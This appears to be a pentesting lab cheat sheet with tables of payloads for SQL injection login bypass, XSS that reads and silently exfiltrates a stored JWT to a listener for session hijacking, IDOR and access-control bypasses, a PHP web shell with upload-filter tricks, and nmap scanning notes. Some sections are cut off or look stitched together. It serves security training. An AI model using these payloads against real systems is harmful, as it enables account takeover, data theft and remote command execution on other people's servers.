' OR 1=1--
Auth bypass in login Quote closes the string, OR 1=1 is always true, -- comments out the password check Lab 03
q=')
Error probe (is it injectable?) Input here sits in nested parens, so ') breaks the query where a lone quote returns an empty 200. A SQL error back means input reaches the DB unfiltered Lab 03

UNION data extraction Staple a second SELECT on with matching column count to pull the Users table into the response Lab 03

Cross-Site Scripting / XSS (Lab 04)

Payload / Command Action How it works Source
<img src=x onerror=alert(document.domain)>
Prove XSS (DOM, reflected or stored) The image source x fails to load, so the onerror handler fires your JS. Works where <script> is stripped but attributes survive Lab 04
<img src=x onerror="alert(localStorage.getItem('token'))">
Read the session token Juice Shop keeps the JWT in localStorage, which JavaScript can read. HttpOnly protects cookies, not this Lab 04
<img src=x onerror="new Image().src='http://localhost:9000/?c='+localStorage.getItem('token')">
Exfil the token silently A hidden image request ships the token to a server you control. No popup, nothing for the victim to notice. On a real job that host is a box online or Burp Collaborator Lab 04
python3 -m http.server 9000
Start the exfil listener A one-line web server on your own machine. Watch its log for a GET /?c=eyJ... line with the stolen token glued on Lab 04
localStorage.setItem('token', '<PASTE_THE_JWT>')
Hijack: replay a stolen session Run in an incognito Console, paste the stolen JWT, reload. You're logged in as the victim with no password Lab 04
<script>alert(1)</script>
Reflected / stored, HTML context The classic solve when your input lands in HTML with nothing encoded. If <script> is filtered, fall back to the onerror image above Lab 04
"onmouseover="alert(1)
Attribute-context breakout When angle brackets are encoded you can't open a tag. The unencoded double quote closes value=" so you bolt an event handler onto the element instead. Exact string depends on the target Lab 04

Broken Access Control (Lab 05)

Request / Technique Action How it works Source
GET /rest/basket/1
IDOR: read another user's object Change the id in the path to one that isn't yours. The server checks your token is valid, then hands over whatever number you asked for without checking ownership Lab 05
GET /api/Users
BOLA: enumerate every account A plain customer token lists all users and their roles. The UI hides the admin link; the endpoint never enforces the role. Gives you the admin target list for free Lab 05
{"BasketId":<yours>,"ProductId":6,"BasketId":<victim>}
HTTP Parameter Pollution (write bypass) Duplicate the key in a POST /api/BasketItems body. The auth check reads the first BasketId (yours, passes); the database uses the last (the victim's). Naive single value returns 401 Lab 05
X-Original-URL: /admin
URL-based access-control bypass Front-end blocks /admin, so request / and add this header. The back-end trusts it and serves the admin path the front-end thought it refused Lab 05
/robots.txt
Forced browsing recon Hidden admin paths are often disclosed in robots.txt, sitemaps, or JS. Hiding a control is not enforcing access to it, request the path directly Lab 05

Payload / Command Action How it works Source
<?php system($_GET['cmd']); ?>
PHP web shell Upload as .php to a server that runs PHP, then request ...php?cmd=id. Runs any OS command as the web user (www-data) and returns the output Lab 06
Content-Type: image/jpeg
Bypass a Content-Type check Keep the .php filename and payload, change only the client-sent Content-Type in Burp. The server trusts a header you control Lab 06
exploit.php%00.jpg

Command Action How it works Source
nmap -sC -sV -oN scan.txt <IP>
The default first scan -sC default scripts, -sV service/version, -oN save to a file. Run this on every box Lab 07

TCP 3-Way Handshake & Port State Deduction

State / Sequence Kernel Response Deducted State Pentester Exploitation / Operational Reality Source
Client [SYN] [SYN-ACK] OPEN Target service is listening and willing to allocate socket buffers. Primary exploit target. Lab 01
Client [SYN] [RST] (Reset) CLOSED Host OS kernel actively rejects packet; indicates host is alive but no daemon is bound. Lab 01
Client [SYN] Timeout / No Reply FILTERED Packet dropped silently by an intervening firewall rule or host-based iptables/ACL. Lab 01
SYN Stealth Scan SYN ➔ SYN-ACK ➔ RST HALF-OPEN Client tears down connection before final ACK to evade web server application-layer logs. Lab 01
TCP vs. UDP Stateful vs Stateless L4 TRADE-OFF TCP guarantees delivery for reverse shells; UDP allows spoofed traffic but is silent when open. Lab 01
